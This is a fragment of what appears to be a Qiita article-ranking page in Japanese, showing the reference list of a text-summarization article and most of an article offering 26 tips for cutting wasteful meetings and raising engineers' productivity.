<li><a href="https://radimrehurek.com/gensim/models/lsimodel.html" rel="nofollow noopener" target="_blank">gensim models.lsimodel</a></li>
</ul>
</li>
</ul>

<p><a href="https://github.com/miso-belica/sumy" rel="nofollow noopener" target="_blank">sumy</a>は、抽出型の手法を広くカバーするソフトウェアになっています。</p>

<p>抽象型(Abstractive)</p>

<ul>
<li><a href="https://github.com/tensorflow/models/tree/master/research/textsum" rel="nofollow noopener" target="_blank">TensorFlow textsum</a></li>
</ul>

<h2>
<span id="42-データセット" class="fragment"></span><a href="#42-%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a>4.2 データセット</h2>

<p>要約を行うためのデータセットとしては、以下のデータセットがあります。</p>

<ul>
<li>
<a href="http://www.cis.upenn.edu/%7Enlp/corpora/sumrepo.html" rel="nofollow noopener" target="_blank">DUC 2004</a>

<ul>
<li>最もメジャーですが、ダウンロードをするのに署名してメール送信しないといけないなどハードルが高いです</li>
</ul>
</li>
<li>
<a href="https://catalog.ldc.upenn.edu/LDC2012T21" rel="nofollow noopener" target="_blank">Annotated English Gigaword</a>

<ul>
<li>こちらは有料のデータセットになります</li>
</ul>
</li>
<li><a href="http://kavita-ganesan.com/opinosis-opinion-dataset" rel="nofollow noopener" target="_blank">Opinosis Dataset - Topic related review sentences</a></li>
<li><a href="http://www.l3s.de/%7Egtran/timeline/" rel="nofollow noopener" target="_blank">17 Timelines</a></li>
<li><a href="http://archive.ics.uci.edu/ml/datasets/Legal+Case+Reports" rel="nofollow noopener" target="_blank">Legal Case Reports Data Set</a></li>
</ul>

<h1>
<span id="x参考文献" class="fragment"></span><a href="#x%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><i class="fa fa-link"></i></a>X.参考文献</h1>

<p>Papers</p>

<ul>
<li><a href="https://www.cis.upenn.edu/%7Enenkova/1500000015-Nenkova.pdf" rel="nofollow noopener" target="_blank">Automatic summarization</a></li>
<li><a href="https://www.cl.cam.ac.uk/archive/ksj21/ksjdigipapers/summbook99.pdf" rel="nofollow noopener" target="_blank">Automatic summarizing: factors and directions</a></li>
<li><a href="https://web.eecs.umich.edu/%7Emihalcea/papers/mihalcea.emnlp04.pdf" rel="nofollow noopener" target="_blank">TextRank: Bringing Order into Texts</a></li>
<li><a href="https://www.cs.cmu.edu/afs/cs/project/jair/pub/volume22/erkan04a-html/erkan04a.html" rel="nofollow noopener" target="_blank">LexRank: Graph-based Lexical Centrality as Salience in Text Summarization</a></li>
<li><a href="http://oldwww.iiit.ac.in/cgi-bin/techreports/display_detail.cgi?id=IIIT/TR/2008/97" rel="nofollow noopener" target="_blank">Sentence Extraction Based Single Document Summarization</a></li>
<li><a href="http://courses.ischool.berkeley.edu/i256/f06/papers/luhn58.pdf" rel="nofollow noopener" target="_blank">Luhn’s Algorithm</a></li>
<li><a href="https://www.researchgate.net/publication/220195824_Text_summarization_using_Latent_Semantic_Analysis" rel="nofollow noopener" target="_blank">Text summarization using Latent Semantic Analysis</a></li>
<li><a href="https://arxiv.org/abs/1704.04368" rel="nofollow noopener" target="_blank">Get To The Point: Summarization with Pointer-Generator Networks</a></li>
</ul>

<p>Blog/Wikis</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/PageRank" rel="nofollow noopener" target="_blank">PageRank</a></li>
<li><a href="https://rare-technologies.com/text-summarization-in-python-extractive-vs-abstractive-techniques-revisited/" rel="nofollow noopener" target="_blank">Text Summarization in Python: Extractive vs. Abstractive techniques revisited</a></li>
<li><a href="https://www.slideshare.net/YusukeOda1/encoderdecoder-tis" rel="nofollow noopener" target="_blank">Encoder-decoder 翻訳 (TISハンズオン資料)</a></li>
<li><a href="https://en.wikipedia.org/wiki/ROUGE_(metric)" rel="nofollow noopener" target="_blank">ROUGE-N</a></li>
<li><a href="http://www.aclweb.org/anthology/P02-1040.pdf" rel="nofollow noopener" target="_blank">BLEU</a></li>
<li><a href="http://www2.nict.go.jp/astrec-att/member/mutiyama/corpmt/4.pdf" rel="nofollow noopener" target="_blank">4. 自動評価尺度 BLEU</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">25位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>381</kbd>
		<a target="_blank" href="https://qiita.com/Akira-Isegawa/items/e33de4309202c73c4ca0">無駄な会議・ミーティングなくし、生産性を上げるためにやるべき26（＋1）のこと</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-30<br />16:48:01</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/199506.html">Akira-Isegawa</a>(7件の記事)<br />(minmeeting 所属)<br><img width="80" height="80" src="https://avatars2.githubusercontent.com/u/996049?v=4">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[アジャイル]</b> <b>[効率化]</b> <b>[会議]</b> <b>[ミーティング]</b> <b>[生産性向上]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>こんにちは。「10分で生産的なミーティングを」できるようにすることを目指して、<a href="https://www.facebook.com/minmeeting/" rel="nofollow noopener" target="_blank">minmeeting</a>というWeb会議ツールを開発している伊勢川です。</p>

<p><a title="Facebook page - minmeeting" href="https://www.facebook.com/minmeeting/" rel="nofollow noopener" target="_blank"><img width="100px" src="https://camo.qiitausercontent.com/e523fdf612ace59e58dad4aefcda2340f75c1ba9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f33326536353537372d613562622d326333622d346433302d3436393063336335636530662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/32e65577-a5bb-2c3b-4d30-4690c3c5ce0f.png"></a></p>

<p>無駄な会議はエンジニアの敵。いろんな会議をハシゴして飛び回っていると、なんだかすごく仕事をしているような気になりますが、我々エンジニアは何かを創り出すのが本来の仕事で、いくら忙しく飛び回ったとしても、よい作品を世に出せなければ存在価値がありません。仕事をしているような気にさせて、創造の時間を奪う無駄な会議は、我々にとって非常に危険な存在であります。</p>

<p>そこで、<b>無駄な会議・残念な会議を撲滅するために、すぐにできること、すぐやるべきこと</b>をまとめました。</p>

<h1>
<span id="会議の調整スケジュール登録" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E8%AA%BF%E6%95%B4%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E7%99%BB%E9%8C%B2"><i class="fa fa-link"></i></a>会議の調整・スケジュール登録</h1>

<h2>
<span id="定例を少しずつ減らす" class="fragment"></span><a href="#%E5%AE%9A%E4%BE%8B%E3%82%92%E5%B0%91%E3%81%97%E3%81%9A%E3%81%A4%E6%B8%9B%E3%82%89%E3%81%99"><i class="fa fa-link"></i></a>定例を少しずつ減らす</h2>

<p>定例は効果的に使えば決して無駄ではありませんが、単なるルーティンワークとして繰り返されているケースも多く、無駄の温床になりがちです。マンネリ化している場合、効果が見えない場合は、<b>一度定例を少しずつ減らしてみましょう</b>。<b>減らしすぎて支障が出るくらいまで</b>やってみるのがオススメです。</p>

<h2>
<span id="参加人数を減らす" class="fragment"></span><a href="#%E5%8F%82%E5%8A%A0%E4%BA%BA%E6%95%B0%E3%82%92%E6%B8%9B%E3%82%89%E3%81%99"><i class="fa fa-link"></i></a>参加人数を減らす</h2>

<p>例えば会社で70万円のモノを購入するとなった場合、市場価格を調べたり、コスト以上の成果が出せるかなど、きっちり検討をして、責任者の承認を得た上で購入すると思います。しかし、<b>毎週1時間のチームミーティングを10人で半年実施</b>すると、時給3000円換算で<b>直接労働者に支払うコストだけで75万を超えます</b>が、週1回の定例の場合に、モノを買う場合と同じくらい、きちんと費用対効果が評価されていないように思います。</p>

<p>会議は人数が増えると、発言者に偏りが生じて、一人ひとりに必要なことが伝わり腹落ちする確率が減ってしまいます。よって、費用面でも効果の面でも、<b>参加人数は必要最小限にすべき</b>で、念のためにあの人も呼んでおこうなどもってのほかです。</p>

<h2>
<span id="会議室テレビ会議システムを予約しない" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E5%AE%A4%E3%83%86%E3%83%AC%E3%83%93%E4%BC%9A%E8%AD%B0%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E4%BA%88%E7%B4%84%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>会議室・テレビ会議システムを予約しない</h2>

<p><b>会議室を予約すると会議が長くなりがち</b>です。また、<b>テレビ会議は準備や機材トラブルで時間を浪費</b>することが多いため、できる限り避けた方がよいでしょう。どうしても必要な場合は、skypeやapper.inのように、準備が簡単で、必要なときに、どこでもすぐ始められる<b>Web会議ツールを使ったほうが効率がよい</b>です。</p>

<h2>
<span id="メールで会議調整をしない" class="fragment"></span><a href="#%E3%83%A1%E3%83%BC%E3%83%AB%E3%81%A7%E4%BC%9A%E8%AD%B0%E8%AA%BF%E6%95%B4%E3%82%92%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>メールで会議調整をしない</h2>

<p><b>メールでの会議調整は時間がかかる</b>し、調整される側も突然訳も分からずに呼ばれると返信する気も失せるので、余計に時間がかかってしまいます。<b>社内会議</b>の場合は、<b>オンラインスケジュールで参加者の空き時間に予定を入れ</b>た上で、<b>参加者全員がいるチャットなどで、参加可否を問う</b>のがよいでしょう。すると、そのチャットの中で一番えらい人以外は、正当な理由がないと延期や不参加が申し出にくくなります。</p>

<p>なお、<b>スケジュール調整の前に対面か電話で直接言葉を交わしてみる</b>とよいでしょう。すると、その人を会議に呼ぶべきか判断できますし、場合によっては<b>会議をしなくても立ち話で問題が解決することも</b>あります。</p>

<p>相手がお客様など<b>社外の人の場合</b>はオンラインスケジュールに直接登録できないことが多いですが、その場合もメールはあくまで補助手段で、<b>電話</b>で話をした方がよいです。大抵の場合、その場で調整が終わります。</p>

<h2>
<span id="偉い人への根回しは早朝か夜遅くか移動中を狙う" class="fragment"></span><a href="#%E5%81%89%E3%81%84%E4%BA%BA%E3%81%B8%E3%81%AE%E6%A0%B9%E5%9B%9E%E3%81%97%E3%81%AF%E6%97%A9%E6%9C%9D%E3%81%8B%E5%A4%9C%E9%81%85%E3%81%8F%E3%81%8B%E7%A7%BB%E5%8B%95%E4%B8%AD%E3%82%92%E7%8B%99%E3%81%86"><i class="fa fa-link"></i></a>偉い人への根回しは早朝か夜遅くか移動中を狙う</h2>

<p>組織で仕事をする以上、各責任者や意思決定者に話を通さないと動きが取れないことも多々あります。しかし、そういった意思決定待ちによって組織の動きが鈍るのは非常に無駄なことです。かといって、そういう偉い人たちに会議に呼びまくって、偉い人たちの仕事の時間を奪うと、余計に決まるものも決まらなくなってしまいます。</p>

<p>単に話を通したいだけなら、数分あれば十分でわざわざ会議をセットする必要はありません。ただ、（単に偉そうな人たちではなく）<b>本当に偉い人たちは、日中結構忙しい</b>はずなので、数分でも捕まらないことが多くあります。その場合は、<b>早朝か夜遅くか移動中を狙うと比較的つかまりやすい</b>でしょう。これは営業マンや新聞記者などが昔からやっている方法なので、目新しくはありませんが、それなりの効果が保証されていると思います。</p>

<h2>
<span id="10分以上の会議は設定しない" class="fragment"></span><a href="#10%E5%88%86%E4%BB%A5%E4%B8%8A%E3%81%AE%E4%BC%9A%E8%AD%B0%E3%81%AF%E8%A8%AD%E5%AE%9A%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>10分以上の会議は設定しない</h2>

<p>最近実施した会議の議事録を見返して、アジェンダを抽出してください。そして、そのアジェンダを議論するのに最低限必要な時間を再見積もりしてみてください。すると、実時間よりも大幅に少ない見積もりになったのではないでしょうか。つまり、理論的にはその再見積もり時間まで会議を短縮することができます。</p>

<p>会議の性質や目的にもよりますが、<b>多くの会議はきちんと準備をすれば10分以内に収めることができます</b>。例えば、朝礼やふりかえりなどで、問題を共有することがありますが、そこで議論が盛り上がって時間を浪費することがよくあります。チームが大きくなると、その議論に参加できる人も限られており、その他の人にとっては全く無駄な時間になります。課題は共有してもよいですが、一緒に問題解決ができそうな人を見つけたら、後でその人たちだけで議論すべきでしょう。</p>

<p>さらに理想を言えば、<b>朝会やふりかえりの時間まで問題を持ち越すのは無駄</b>で、<b>問題が起きた時点で、すぐに共有</b>して、必要な人を集めて<b>解決</b>をすべきです。</p>

<p>このように、すぐに<b>細かい単位で最小限の人で問題を解決</b>していけば、それぞれの会議で10分以上かかることも少なくなるでしょう。</p>

<p>ただし、あまり細々処理しすぎるとオーバーヘッドが大きくなることもあります。<b>オンライン処理に向いているのか、バッチ処理に向いているのかを、リーダーなどの相談を受ける側の人が即座に判断</b>して、後者の場合は、ヒマができたときにまとめて処理すると効率がよいでしょう。</p>

<h2>
<span id="判断が必要な会議は13時15時を狙う" class="fragment"></span><a href="#%E5%88%A4%E6%96%AD%E3%81%8C%E5%BF%85%E8%A6%81%E3%81%AA%E4%BC%9A%E8%AD%B0%E3%81%AF13%E6%99%8215%E6%99%82%E3%82%92%E7%8B%99%E3%81%86"><i class="fa fa-link"></i></a>判断が必要な会議は13時〜15時を狙う</h2>

<p>『時間の使い方を科学する』という本（参考資料1）によると、<b>思考が必要な作業は10時〜14時、記憶が必要な作業は16時〜20時が適している</b>そうです。判断が必要な会議は思考重視のため、早い時間帯の方がよさそうですが、<b>エンジニアの場合、思考が活発になる午前中は設計や生産などに充てるべき</b>です。そのため、お昼を食べてちょっと眠くなる<b>13時から15時あたり</b>に、気分転換を兼ねて、お茶でも飲みながら会議をするのが<b>狙い目</b>です。</p>

<h2>
<span id="共有会議はなるべく避けどうしても必要なら夕方定時前にする" class="fragment"></span><a href="#%E5%85%B1%E6%9C%89%E4%BC%9A%E8%AD%B0%E3%81%AF%E3%81%AA%E3%82%8B%E3%81%B9%E3%81%8F%E9%81%BF%E3%81%91%E3%81%A9%E3%81%86%E3%81%97%E3%81%A6%E3%82%82%E5%BF%85%E8%A6%81%E3%81%AA%E3%82%89%E5%A4%95%E6%96%B9%E5%AE%9A%E6%99%82%E5%89%8D%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>共有会議はなるべく避け、どうしても必要なら夕方定時前にする</h2>

<p><b>単に情報を共有するだけ</b>の会議であれば、動画をとって参加者にばらまくのと大差がないので、<b>やめた方がよい</b>です。</p>

<p>ただ、どうしても直接伝えたいこともあり、<b>共有会議が必要な場合</b>は、最も生産的であるべき午前や日中の時間帯は避けて、記憶に定着のしやすい<b>夕方の時間帯</b>を狙うのがよいでしょう。</p>

<h2>
<span id="アイディア出しなどの発散はチャットツールなどを用いて非同期で行う" class="fragment"></span><a href="#%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A3%E3%82%A2%E5%87%BA%E3%81%97%E3%81%AA%E3%81%A9%E3%81%AE%E7%99%BA%E6%95%A3%E3%81%AF%E3%83%81%E3%83%A3%E3%83%83%E3%83%88%E3%83%84%E3%83%BC%E3%83%AB%E3%81%AA%E3%81%A9%E3%82%92%E7%94%A8%E3%81%84%E3%81%A6%E9%9D%9E%E5%90%8C%E6%9C%9F%E3%81%A7%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a>アイディア出しなどの発散はチャットツールなどを用いて非同期で行う</h2>

<p>アイディア出しのミーティングを一堂に会して行うと、盛り上がってあっという間に1時間、2時間と経過してしまいます。それ自体は悪いことではありませんが、アイディアは実現しなければ何の価値もないため、エンジニアとしては、実現に時間を使いたいところです。</p>

<p>アイディアは会議室では生まれないとよく言われることですが、たしかに面白いアイディアは会議をしているときよりも、昼食を食べているときや寝る前など別のことをしているときが多いような気がします。参考資料2の記事によると、<b>まず困難な問題に本腰を入れてしばらく取り組み、生産性の低下やストレスの低下を感じ始めた後に、切り替えて休憩をしてリラックスをすると、創造的なアイディアや問題解決の方法がひらめく「ブレークアウト」（ゾーン）の状態に</b>なるそうです。つまり、会議室だけでは、よいアイディアを取りこぼしている可能性が高いということです。</p>

<p>また、<b>対面でアイディア出し</b>をすると、会話の流れによっては、発散がしきらず、部分的な議論のみに終始することがよくあります。相手が話している間に新しいアイディアを出すことができないので、アイディア出しのスピードの面でも対面は<b>あまりよくない</b>というデータもあります（参考資料3）。</p>

<p>そのため、アイディア出しの発散は、ある程度期間をとって、<b>チャットツールなどを使って、非同期で十分発散してアイディアが出た上で、対面</b>のミーティングを行うとよいでしょう。</p>

<h2>
<span id="雑談やアジェンダレスで話がしたい場合はランチミーティングかティータイムをセットする" class="fragment"></span><a href="#%E9%9B%91%E8%AB%87%E3%82%84%E3%82%A2%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%80%E3%83%AC%E3%82%B9%E3%81%A7%E8%A9%B1%E3%81%8C%E3%81%97%E3%81%9F%E3%81%84%E5%A0%B4%E5%90%88%E3%81%AF%E3%83%A9%E3%83%B3%E3%83%81%E3%83%9F%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%8B%E3%83%86%E3%82%A3%E3%83%BC%E3%82%BF%E3%82%A4%E3%83%A0%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>雑談やアジェンダレスで話がしたい場合はランチミーティングかティータイムをセットする</h2>

<p>アジェンダを決めて、<b>きっちりと時間管理をしたミーティング</b>ばかりを行っていると、脱線しづらくなり、<b>計画外のテーマについては議論がされにくくなる</b>というデメリットがあります。そんな際には、たまに<b>ランチミーティングやティータイム</b>をセットして、ゆっくりと雑談してみてもよいでしょう。</p>

<h2>
<span id="自分のtodoはこまめにスケジュールに登録しておくことで無駄な会議が勝手に登録されるのを防ぐ" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E3%81%AEtodo%E3%81%AF%E3%81%93%E3%81%BE%E3%82%81%E3%81%AB%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AB%E7%99%BB%E9%8C%B2%E3%81%97%E3%81%A6%E3%81%8A%E3%81%8F%E3%81%93%E3%81%A8%E3%81%A7%E7%84%A1%E9%A7%84%E3%81%AA%E4%BC%9A%E8%AD%B0%E3%81%8C%E5%8B%9D%E6%89%8B%E3%81%AB%E7%99%BB%E9%8C%B2%E3%81%95%E3%82%8C%E3%82%8B%E3%81%AE%E3%82%92%E9%98%B2%E3%81%90"><i class="fa fa-link"></i></a>自分のToDoはこまめにスケジュールに登録しておくことで、無駄な会議が勝手に登録されるのを防ぐ</h2>

<p>少し観点が変わりますが、自分のToDoリストはオンラインスケジュールに登録しておくとよいです。今自分が何をしているのか、チームや社内の人に共有できるのと同時に、無駄な会議が勝手に登録されるのを牽制できます。（それでも勝手にスケジュールを入れてくる人はまだいますが、多くの人は空気を読んでくれます。）</p>

<h1>
<span id="会議の準備" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E6%BA%96%E5%82%99"><i class="fa fa-link"></i></a>会議の準備</h1>

<h2>
<span id="web会議を行う場合は10分前につなぐルールとする" class="fragment"></span><a href="#web%E4%BC%9A%E8%AD%B0%E3%82%92%E8%A1%8C%E3%81%86%E5%A0%B4%E5%90%88%E3%81%AF10%E5%88%86%E5%89%8D%E3%81%AB%E3%81%A4%E3%81%AA%E3%81%90%E3%83%AB%E3%83%BC%E3%83%AB%E3%81%A8%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Web会議を行う場合は10分前につなぐルールとする</h2>

<p>Web会議はよく接続のトラブルが発生し、よく遅れるというのは、多くの人が経験していることでしょう。IDG Research社の調査によると、<b>オンライン会議</b>ツールを使っている人の56%は接続で技術的な問題を経験しており、オーバム社の調査によると、会議が遅れるときの<b>遅延時間の平均は10分</b>だそうです（参考資料4）。</p>

<p>それならば、Web会議のトラブルと遅延は見越して、<b>会議開始の10分前には接続</b>をして準備をしておくとよいでしょう。</p>

<h2>
<span id="スタンディングミーティングにする" class="fragment"></span><a href="#%E3%82%B9%E3%82%BF%E3%83%B3%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%9F%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>スタンディングミーティングにする</h2>

<p><b>立ち会議</b>にすると、ダラダラと長時間はやってられないので、<b>会議を短く</b>するのに効果的です。また、動き回りやすいため、<b>議論が活発に</b>なるという効果もあります。</p>

<h2>
<span id="アジェンダは事前に参加者に共有し過不足がないようにしておく" class="fragment"></span><a href="#%E3%82%A2%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%80%E3%81%AF%E4%BA%8B%E5%89%8D%E3%81%AB%E5%8F%82%E5%8A%A0%E8%80%85%E3%81%AB%E5%85%B1%E6%9C%89%E3%81%97%E9%81%8E%E4%B8%8D%E8%B6%B3%E3%81%8C%E3%81%AA%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%97%E3%81%A6%E3%81%8A%E3%81%8F"><i class="fa fa-link"></i></a>アジェンダは事前に参加者に共有し、過不足がないようにしておく</h2>

<p><b>アジェンダを決めておく</b>だけでも、会議が脱線してなかなか前に進まないという状態を避けることができます。アジェンダは会議の内容や流れを決める重要なことなので、<b>事前に参加者に共有して、過不足がない状態に</b>しておきましょう。「そもそもの目的はなんだっけ」と言わせない準備が必要です。</p>

<h2>
<span id="アジェンダごとの予定時間を決めておき会議の終了予定時間を定める" class="fragment"></span><a href="#%E3%82%A2%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%80%E3%81%94%E3%81%A8%E3%81%AE%E4%BA%88%E5%AE%9A%E6%99%82%E9%96%93%E3%82%92%E6%B1%BA%E3%82%81%E3%81%A6%E3%81%8A%E3%81%8D%E4%BC%9A%E8%AD%B0%E3%81%AE%E7%B5%82%E4%BA%86%E4%BA%88%E5%AE%9A%E6%99%82%E9%96%93%E3%82%92%E5%AE%9A%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>アジェンダごとの予定時間を決めておき、会議の終了予定時間を定める</h2>

<p><b>アジェンダ</b>を準備する際は、<b>予定時間も定めておき</b>ましょう。それにより、今会議が遅れているのか進んでいるのかが明確になり、<b>時間管理</b>ができるようになります。</p>

<h2>
<span id="資料を作り込みすぎない" class="fragment"></span><a href="#%E8%B3%87%E6%96%99%E3%82%92%E4%BD%9C%E3%82%8A%E8%BE%BC%E3%81%BF%E3%81%99%E3%81%8E%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>資料を作り込みすぎない</h2>

<p>会議用の<b>資料はアジェンダのメモ書き程度で十分</b>で、説明資料づくりにあまり時間を費やしすぎないようにしましょう。</p>

<h1>
<span id="会議の進行" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E9%80%B2%E8%A1%8C"><i class="fa fa-link"></i></a>会議の進行</h1>

<h2>
<span id="目的とアジェンダを掲げる" class="fragment"></span><a href="#%E7%9B%AE%E7%9A%84%E3%81%A8%E3%82%A2%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%80%E3%82%92%E6%8E%B2%E3%81%92%E3%82%8B"><i class="fa fa-link"></i></a>目的とアジェンダを掲げる</h2>

<p>会議の<b>目的</b>と事前に準備した<b>アジェンダ</b>は、口で説明するだけでなく、できれば<b>全員が見える場所に掲げてください</b>。それにより、参加者全員が、目的に向かって、<b>今何をすべきかが明確に</b>なり、余計な脱線を防ぎ、動きやすくなります。</p>

<h2>
<span id="アジェンダごとに時間を測る" class="fragment"></span><a href="#%E3%82%A2%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%80%E3%81%94%E3%81%A8%E3%81%AB%E6%99%82%E9%96%93%E3%82%92%E6%B8%AC%E3%82%8B"><i class="fa fa-link"></i></a>アジェンダごとに時間を測る</h2>

<p>前述の通り、アジェンダごとに予定時間を定めたら、会議を進める際は、<b>アジェンダ別に時間を計測</b>しましょう。計測をすることで、計画との差異が明確になり、<b>予定通りに進めようとする圧力</b>が加わります。ダラダラと話さず、<b>急いで発言</b>することによって、<b>議論がいつもより活性化</b>されます。</p>

<h2>
<span id="役職に関係なく司会とタイムキーパーと書記を決める" class="fragment"></span><a href="#%E5%BD%B9%E8%81%B7%E3%81%AB%E9%96%A2%E4%BF%82%E3%81%AA%E3%81%8F%E5%8F%B8%E4%BC%9A%E3%81%A8%E3%82%BF%E3%82%A4%E3%83%A0%E3%82%AD%E3%83%BC%E3%83%91%E3%83%BC%E3%81%A8%E6%9B%B8%E8%A8%98%E3%82%92%E6%B1%BA%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>役職に関係なく司会とタイムキーパーと書記を決める</h2>

<p>誰も仕切らず、ダラダラと進む会議は時間もかかり、非生産的です。<b>司会とタイムキーパーを決めるだけで、ずっとまし</b>になります。人によるうまい下手はありますが、アナーキーよりはましです。また、<b>書記を定めてディスカッションの流れを可視化</b>しましょう。</p>

<h2>
<span id="ホワイトボードか大きなディスプレイを用いる" class="fragment"></span><a href="#%E3%83%9B%E3%83%AF%E3%82%A4%E3%83%88%E3%83%9C%E3%83%BC%E3%83%89%E3%81%8B%E5%A4%A7%E3%81%8D%E3%81%AA%E3%83%87%E3%82%A3%E3%82%B9%E3%83%97%E3%83%AC%E3%82%A4%E3%82%92%E7%94%A8%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>ホワイトボードか大きなディスプレイを用いる</h2>

<p><b>会議を脱線させずに、今の議題に集中してもらう</b>ためには、<b>全員で一つのホワイトボードを見る</b>のがよいです。<b>画面共有のツール</b>を使ってもよいですが、その場合も<b>各拠点で一つの大きなディスプレイ</b>を見るようにして、各人がバラバラに自分のPCを見ることがないようにしましょう。皆が違う方向を見ながら会議をすると、盛り上がりと集中を欠く会議になりがちです。</p>

<h2>
<span id="ムダ話が長い人には注意をする" class="fragment"></span><a href="#%E3%83%A0%E3%83%80%E8%A9%B1%E3%81%8C%E9%95%B7%E3%81%84%E4%BA%BA%E3%81%AB%E3%81%AF%E6%B3%A8%E6%84%8F%E3%82%92%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ムダ話が長い人には注意をする</h2>

<p>ここまでやっても、無駄話をしてしまう人はまだいます。そういう人には、今はその話をすべきではないと、<b>はっきりと注意</b>をしましょう。</p>

<h2>
<span id="発言がない人には質問をするそれでも何も出なければ会議から外す" class="fragment"></span><a href="#%E7%99%BA%E8%A8%80%E3%81%8C%E3%81%AA%E3%81%84%E4%BA%BA%E3%81%AB%E3%81%AF%E8%B3%AA%E5%95%8F%E3%82%92%E3%81%99%E3%82%8B%E3%81%9D%E3%82%8C%E3%81%A7%E3%82%82%E4%BD%95%E3%82%82%E5%87%BA%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E4%BC%9A%E8%AD%B0%E3%81%8B%E3%82%89%E5%A4%96%E3%81%99"><i class="fa fa-link"></i></a>発言がない人には質問をする。それでも何も出なければ会議から外す</h2>

<p>会議中に地蔵のように押し黙っている人がいますが、同意しており発言する必要がないから黙っているのか、関心がないから黙っているのかを区別するために、<b>司会は質問を投げかけ</b>ましょう。<b>関心がない場合</b>は、居てもムダなので、すぐに<b>会議から出ていってもらい</b>ましょう。</p>

<h1>
<span id="会議の事後処理" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E4%BA%8B%E5%BE%8C%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>会議の事後処理</h1>

<h2>
<span id="決定事項やtodoは必ず書き留めて参加者に共有する" class="fragment"></span><a href="#%E6%B1%BA%E5%AE%9A%E4%BA%8B%E9%A0%85%E3%82%84todo%E3%81%AF%E5%BF%85%E3%81%9A%E6%9B%B8%E3%81%8D%E7%95%99%E3%82%81%E3%81%A6%E5%8F%82%E5%8A%A0%E8%80%85%E3%81%AB%E5%85%B1%E6%9C%89%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>決定事項やTODOは必ず書き留めて参加者に共有する</h2>

<p>会議だけして、その後行動に起こさなければ意味がありません。<b>決定事項やTODOは必ず書き留めて、参加者に共有</b>し、やるべきことが<b>実施されるまできっちりフォロー</b>しましょう。</p>

<h2>
<span id="きれいな議事録はとらない" class="fragment"></span><a href="#%E3%81%8D%E3%82%8C%E3%81%84%E3%81%AA%E8%AD%B0%E4%BA%8B%E9%8C%B2%E3%81%AF%E3%81%A8%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>きれいな議事録はとらない</h2>

<p>会議中にごちゃごちゃと書いたホワイトボードのメモでも、次に見たときに、すぐに内容を思い出すことができます。他方で、きれいにまとめられた議事録を読んでも、前回の議論の内容を思い出すのに時間がかかってしまいます。次回の会議の際に、内容を思い出すのが目的であれば、<b>ホワイトボードを写真にとって保存しておくだけで十分</b>で、きれいな議事録は不要です。</p>

<h2>
<span id="会議のコストを算出する" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E3%82%B3%E3%82%B9%E3%83%88%E3%82%92%E7%AE%97%E5%87%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>会議のコストを算出する</h2>

<p><b>会議にかかるコスト</b>を算出して、<b>見える化</b>しましょう。それだけで無駄な会議を減らす圧力になります。主なコストは人件費ですが、テレビ会議システムの費用や、都心の場合は不動産費もそれなりの額になります。また、顧客にサービスを提供した場合の客単価で計算すると、逸失利益も算出できます。</p>

<h2>
